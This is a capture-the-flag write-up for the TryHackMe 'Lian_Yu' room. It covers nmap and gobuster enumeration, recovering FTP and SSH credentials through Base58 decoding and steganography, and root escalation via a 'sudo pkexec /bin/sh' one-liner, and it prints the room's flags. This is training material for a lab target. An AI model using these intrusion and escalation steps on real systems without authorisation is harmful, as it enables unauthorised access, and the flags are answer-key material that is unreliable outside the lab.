## Lian_Yu - TryHackMe Writeup

[Room Link](https://tryhackme.com/room/lianyu)

**IP: 10.10.244.168**

---

## 📌 General Information

**Room Difficulty**: Easy  <br>

**Room Type**: Linux Privilege Escalation, Web, Steganography <br>

**Tools Used**: Nmap, Gobuster, Steghide<br>

**Author**: <br>

[<img align='center' src="https://github.com/mauzware/mauzware/blob/main/LOGO%20NEW.png"/>](https://github.com/mauzware)

[TryHackMe Profile](https://tryhackme.com/p/mauzinho) <br>
[GitHub Profile](https://github.com/mauzware)

---

## 🔍 Enumeration

- Starting off with Nmap and a lot of enumeration with Gobuster.

  ```
  nmap -sC -sV -T5 -p- 10.10.244.168 

  PORT      STATE SERVICE VERSION
  21/tcp    open  ftp     vsftpd 3.0.2
  22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
  | ssh-hostkey: 
  |   1024 56:50:bd:11:ef:d4:ac:56:32:c3:ee:73:3e:de:87:f4 (DSA)
  |   2048 39:6f:3a:9c:b6:2d:ad:0c:d8:6d:be:77:13:07:25:d6 (RSA)
  |   256 a6:69:96:d7:6d:61:27:96:7e:bb:9f:83:60:1b:52:12 (ECDSA)
  |_  256 3f:43:76:75:a8:5a:a6:cd:33:b0:66:42:04:91:fe:a0 (ED25519)
  80/tcp    open  http    Apache httpd
  |_http-title: Purgatory
  |_http-server-header: Apache
  111/tcp   open  rpcbind 2-4 (RPC #100000)
  | rpcinfo: 
  |   program version    port/proto  service
  |   100000  2,3,4        111/tcp   rpcbind
  |   100000  2,3,4        111/udp   rpcbind
  |   100000  3,4          111/tcp6  rpcbind
  |   100000  3,4          111/udp6  rpcbind
  |   100024  1          35738/tcp6  status
  |   100024  1          40174/udp6  status
  |   100024  1          50769/udp   status
  |_  100024  1          60194/tcp   status
  60194/tcp open  status  1 (RPC #100024)
  Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
  ```

  ```
  gobuster dir -u http://10.10.244.168/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt 

  ===============================================================
  Starting gobuster in directory enumeration mode
  ===============================================================
  /island               (Status: 301) [Size: 236] [--> http://10.10.244.168/island/]
  Progress: 87664 / 87665 (100.00%)
  ===============================================================
  Finished
  ===============================================================

  gobuster dir -u http://10.10.244.168/island -w /usr/share/seclists/Fuzzing/4-digits-0000-9999.txt
  ===============================================================
  Starting gobuster in directory enumeration mode
  ===============================================================
  /2100                 (Status: 301) [Size: 241] [--> http://10.10.244.168/island/2100/]
  Progress: 10000 / 10001 (99.99%)
  ===============================================================
  Finished
  ===============================================================
  ```
  
- Keep in mind, Gobuster is slow and this will take a while. On `/island` you will find a FTP username and in source code of `/island/2100` you will find a hint for hidden file.

  ```
  http://10.10.244.168/island

   Ohhh Noo, Don't Talk...............
  
  I wasn't Expecting You at this Moment. I will meet you there
  
  You should find a way to Lian_Yu as we are planed. The Code Word is:
  vigilante

  http://10.10.244.168/island/2100
  <!-- you can avail your .ticket here but how?   -->
  ```
  
- Nice, so now we know for which file type to look, more enumeration coming.

  ```
  gobuster dir -u http://10.10.244.168/island/2100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x .ticket 

  ===============================================================
  Starting gobuster in directory enumeration mode
  ===============================================================
  /green_arrow.ticket   (Status: 200) [Size: 71]
  Progress: 175328 / 175330 (100.00%)
  ===============================================================
  Finished
  ===============================================================
  ```

- Now visit the directory with ticket in order to find FTP password.

  ```
  http://10.10.244.168/island/2100/green_arrow.ticket


  This is just a token to get into Queen's Gambit(Ship)
  
  
  RTy8yhBQdscX
  ```

- Decode the string, it's Base58 and use the credentials to login with FTP.

---

## ⚙️ Initial Access

- After logging with FTP you'll see three files in vigilante directory, download them all. I also tried to access slade's directory but it was unsuccessfull.

  ```
  ftp 10.10.244.168
  vigilante
  !#th3h00d
  
  230 Login successful.
  Remote system type is UNIX.
  Using binary mode to transfer files.
  ftp> pwd
  Remote directory: /home/vigilante
  ftp> ls
  229 Entering Extended Passive Mode (|||56673|).
  150 Here comes the directory listing.
  -rw-r--r--    1 0        0          511720 May 01  2020 Leave_me_alone.png
  -rw-r--r--    1 0        0          549924 May 05  2020 Queen's_Gambit.png
  -rw-r--r--    1 0        0          191026 May 01  2020 aa.jpg
  226 Directory send OK.
  ```
  
- Now comes my favourite part, steganography. If you try to open `Leave_me_alone.png` you'll see nothing which means image needs some editing. Open it with `hexedit` and change first 8 bytes to this: `89 50 4E 47 0D 0A 1A 0A`

- If you did it correctly now you'll be able to open the image and find the hidden password which is `password` lulz... So now I tried using that password for SSH but it is not the right one. This is actually a passphrase for `steghide`.

  ```
  steghide --extract -sf aa.jpg   
  Enter passphrase: 
  wrote extracted data to "ss.zip".
  
  cat shado                
  M3tahuman
  
  cat passwd.txt 
  This is your visa to Land on Lian_Yu # Just for Fun ***
  
  
  a small Note about it
  
  
  Having spent years on the island, Oliver learned how to be resourceful and 
  set booby traps all over the island in the common event he ran into dangerous
  people. The island is also home to many animals, including pheasants,
  wild pigs and wolves.
  ```
  
- At this moment, all questions should be done except last two flags, so let's login with SSH and get them!

---

## 🧍 User Privilege Escalation

- OK, so here I first tried vigilante, oliver, Oliver and even Lian_Yu as username but nothing worked. Then I remembered the directory I couldn't access in FTP and used that one, it worked!

  ```
  ssh slade@10.10.244.168
  slade@10.10.244.168's password: 
                                Way To SSH...
                            Loading.........Done.. 
                     Connecting To Lian_Yu  Happy Hacking
  
  ██╗    ██╗███████╗██╗      ██████╗ ██████╗ ███╗   ███╗███████╗██████╗ 
  ██║    ██║██╔════╝██║     ██╔════╝██╔═══██╗████╗ ████║██╔════╝╚════██╗
  ██║ █╗ ██║█████╗  ██║     ██║     ██║   ██║██╔████╔██║█████╗   █████╔╝
  ██║███╗██║██╔══╝  ██║     ██║     ██║   ██║██║╚██╔╝██║██╔══╝  ██╔═══╝ 
  ╚███╔███╔╝███████╗███████╗╚██████╗╚██████╔╝██║ ╚═╝ ██║███████╗███████╗
   ╚══╝╚══╝ ╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝╚══════╝
  
  
          ██╗     ██╗ █████╗ ███╗   ██╗     ██╗   ██╗██╗   ██╗
          ██║     ██║██╔══██╗████╗  ██║     ╚██╗ ██╔╝██║   ██║
          ██║     ██║███████║██╔██╗ ██║      ╚████╔╝ ██║   ██║
          ██║     ██║██╔══██║██║╚██╗██║       ╚██╔╝  ██║   ██║
          ███████╗██║██║  ██║██║ ╚████║███████╗██║   ╚██████╔╝
          ╚══════╝╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝    ╚═════╝  #
  
  slade@LianYu:~$ whoami
  slade
  
  slade@LianYu:~$ id
  uid=1000(slade) gid=1000(slade) groups=1000(slade),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),115(bluetooth)
  ```
  
- First flag it's already there.

  ```
  slade@LianYu:~$ pwd
  /home/slade
  
  slade@LianYu:~$ ls -al
  total 32
  drwx------ 2 slade slade 4096 May  1  2020 .
  drwxr-xr-x 4 root  root  4096 May  1  2020 ..
  -rw------- 1 slade slade   22 May  1  2020 .bash_history
  -rw-r--r-- 1 slade slade  220 May  1  2020 .bash_logout
  -rw-r--r-- 1 slade slade 3515 May  1  2020 .bashrc
  -r-------- 1 slade slade   77 May  1  2020 .Important
  -rw-r--r-- 1 slade slade  675 May  1  2020 .profile
  -r-------- 1 slade slade   63 May  1  2020 user.txt
  
  slade@LianYu:~$ cat user.txt 
  THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}
                          --Felicity Smoak
  ```
  
- Moving to escalation now.

---

## 👑 Root Privilege Escalation

- This one is pretty easy, trust me. Use `sudo -l` and then look on GTFOBins for `pkexec` escalation, it's a oneliner.

  ```
  slade@LianYu:~$ sudo -l
  [sudo] password for slade: 
  Matching Defaults entries for slade on LianYu:
      env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
  
  User slade may run the following commands on LianYu:
      (root) PASSWD: /usr/bin/pkexec
  
  slade@LianYu:~$ sudo pkexec /bin/sh
  # whoami
  root
  # id
  uid=0(root) gid=0(root) groups=0(root)
  # cat /root/root.txt
                            Mission accomplished
  
  
  
  You are injected me with Mirakuru:) ---> Now slade Will become DEATHSTROKE. 
  
  
  
  THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}
                                                                                --DEATHSTROKE
  
  Let me know your comments about this machine :)
  I will be available @twitter @User6825
  ```
  
- With all being said, pretty fun room, enjoyed this one.

---

## 🏁 Flags

- **User Flag**: `THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}`
- **Root Flag**: `THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}`

---

## 💬 Notes & Reflections

- What was challenging in this room for me?
  `Waiting for Gobuster to finish all enumeration...`

- What did I learn?
  `Nothing much, just sharpening my skills.`

- I would recommend this room or any type of CTF challenge to every Cyber Security enthusiast since it will sharpen your skills better than any book/tutorial/course or walkthrough rooms on many different platforms!

- Thank you for reading! Enjoy, Have Fun and Happy Hacking! 🤟

---
